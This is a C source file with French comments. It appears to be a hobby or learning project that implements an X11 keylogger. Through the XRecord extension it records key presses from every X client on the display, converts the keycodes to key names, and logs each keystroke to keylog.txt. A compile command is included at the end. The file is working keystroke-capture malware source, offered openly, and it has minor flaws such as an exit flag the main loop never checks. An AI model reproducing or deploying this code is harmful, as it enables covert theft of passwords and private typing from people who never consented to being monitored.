#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xproto.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>
#include <X11/XKBlib.h>
# include <stdbool.h> 
# include <signal.h>
# include <unistd.h> 
Display *ctrl_display = NULL;     // Pour le XRecord
Display *data_display = NULL;     // Pour décoder les touches

XRecordContext ctx = 0 ; 
FILE *log_file =NULL ; 
bool running =true ; 

void handle_signal(int sig) {
    running = false;
}

//Cette fonction est appelée automatiquement à chaque événement intercepté.
void record_callback ( XPointer closure , XRecordInterceptData *recorded_data ){ 

    // On ignore tout ce qui ne vient pas directement du serveur X.
    if ( recorded_data->category != XRecordFromServer ) { 
        XRecordFreeData( recorded_data ) ; 
     return ; 
    }

    // Vérifie si l'événement est une frappe de touche (KeyPress)
    unsigned char *data = recorded_data-> data ; 
    printf("Event received: %u\n", data[0]);
    if ( data [ 0] == KeyPress ) { 
        
        unsigned int keycode =data [ 1] ; 

    //dispaly temporaire 
        Display  *dsp = (Display *)closure;
      
    //transforme le keycode en caractère lisible (KeySym → string)
        KeySym keysym = XkbKeycodeToKeysym (dsp , keycode , 0 , 0 ) ;  
        const char *keystring = XKeysymToString ( keysym) ; 

    //Écrit la touche dans un fichier log.txt.
   
    if (keystring == NULL) keystring = "Unknown";

    fprintf(log_file, "Touche pressée : %s (keycode: %u)\n", keystring, keycode);
    fflush(log_file);

    printf("Key pressed: %s (keycode: %u)\n", keystring, keycode);
    }
    XRecordFreeData ( recorded_data) ; 
}
int main () { 
    signal(SIGINT, handle_signal);
  


    log_file = fopen("keylog.txt", "a");
    if (!log_file) {
        fprintf(stderr, "Erreur: impossible d'ouvrir keylog.txt\n");
        return 1;
    }

    ctrl_display = XOpenDisplay(NULL);  // Pour XRecord
    data_display = XOpenDisplay(NULL);  // Pour décoder les touches

    if (!ctrl_display || !data_display) {
        fprintf(stderr, "Impossible d'ouvrir une des connexions X11\n");
        return 1;
    }
    
    

    //Vérifie si l’extension XRecord est bien présente.
    int major , minor ; 
    if (!XRecordQueryVersion(ctrl_display, &major , &minor )) { 
        fprintf (stderr , "XRecord extension not available \n ") ;
        return 1 ; 
    }

    //On écoute uniquement les événements de type KeyPress.
    XRecordRange *range = XRecordAllocRange();

    if (!range) {
        fprintf(stderr, "Failed to allocate record range\n");

        return 1;
    }
    range-> device_events.first = KeyPress ; 
    range-> device_events.last = KeyPress ;


    // on ecoute all the Xclient connect with the xserver   //On cible tous les clients X (fenêtres, terminaux, etc.)
    XRecordClientSpec client_spec = XRecordAllClients ; 

    
    // TO RECORD CONTENT ( CAPTURE ) 
    XRecordContext ctx =XRecordCreateContext ( ctrl_display , 0, &client_spec , 1, &range , 1 ) ; 
    XFree(range); 

    if( !ctx  ) {  
  
        fprintf( stderr , "fail to record content " ) ; 
        return 1 ; 

    }
    // Lance l'enregistrement et déclenche record_callback à chaque événement.( LIRE ) 
    if (!XRecordEnableContextAsync(ctrl_display , ctx , record_callback , (XPointer) data_display ) ) { 
        fprintf( stderr , "failed to enable context \n" ) ;
        return 1 ;  
    }

    printf ( "keylogger started ..\n " ) ; 
    fflush(stdout ) ; 

    while ( 1) { 
        if (XPending(ctrl_display)) {
        //Traite en boucle tous les événements capturés.
        XRecordProcessReplies ( ctrl_display ) ; 
usleep ( 1000) ;  
   }
}
    printf("Stopping keylogger...\n");
    // Nettoyage
    XRecordDisableContext ( ctrl_display , ctx ) ; 
    XRecordFreeContext( ctrl_display, ctx) ; 
    XCloseDisplay ( ctrl_display ) ; 
    XCloseDisplay( data_display ) ; 
    fclose(log_file);
    return 0 ; 
}

/*
gcc -o keylogger keylogger.c -lX11 -lXtst -lXext -lxkbfile
*/